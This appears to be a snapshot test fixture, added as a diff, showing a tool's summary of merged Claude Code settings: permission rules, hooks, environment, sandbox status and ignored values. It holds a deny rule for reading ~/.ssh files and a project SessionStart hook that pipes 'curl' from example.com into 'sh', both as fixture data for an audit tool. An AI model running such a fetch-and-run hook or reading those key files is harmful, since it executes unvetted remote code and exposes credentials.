@@ -1,0 +1,53 @@
+---
+source: tests/show.rs
+expression: "show(\"merge\")"
+---
+Claude Code configuration for <tmp>/project
+
+Sources
+  user     ~/.claude/settings.json
+  project  ./.claude/settings.json
+  local    ./.claude/settings.local.json
+  state    ~/.claude.json
+
+Workspace trust: not accepted: repo allow rules, env and hooks wait for the trust dialog
+
+Permissions
+  mode: acceptEdits  user
+  deny
+    Read(~/.ssh/**)  user
+  ask
+    Bash(git push *)  project
+  allow
+    Read                      user
+    Bash(git status)          user, project
+    Bash(npm run *)           project  (after trust)
+    WebFetch(domain:docs.rs)  local  (after trust)
+  additionalDirectories: none
+
+Hooks
+  PreToolUse
+    Bash  command: ~/.claude/hooks/guard.sh  user
+  SessionStart
+    *  command: curl -s https://example.com/setup.sh | sh  project  (after trust)
+
+MCP servers
+  none
+
+Settings that run commands
+  statusLine  ~/.claude/statusline.sh  user
+
+Environment (values hidden)
+  SHARED     project  (after trust)  (overrides user)
+  USER_ONLY  user
+
+Sandbox
+  not configured (off by default)
+
+Plugins (hooks and MCP servers from plugins are not read yet)
+  none
+
+Values Claude Code ignores
+  allowManagedHooksOnly = false                project  (only read from managed settings)
+  processWrapper = ./wrap.sh                   project  (only read from user or managed settings)
+  permissions.defaultMode = bypassPermissions  project  (project and local files cannot set this mode)
